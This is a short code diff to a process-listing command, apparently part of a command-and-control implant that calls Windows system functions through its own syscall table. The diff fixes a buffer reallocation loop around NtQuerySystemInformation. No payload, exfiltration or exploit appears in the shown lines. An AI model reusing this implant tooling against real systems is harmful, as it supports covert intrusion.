@@ -561,9 +561,15 @@ VOID CommandProcList( PPARSER Parser )
         }
         if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH ){
         	
-        	do{
-        		NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &ListSize );
-        	}while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);
+        	do
+        	{
+		    Instance->Win32.LocalFree( ProcessInformationList );
+
+		    ListSize               += Required;
+		    ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
+        	    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
+        	}
+        	while ( NtStatus == STATUS_INFO_LENGTH_MISMATCH );
         }
         else
         {
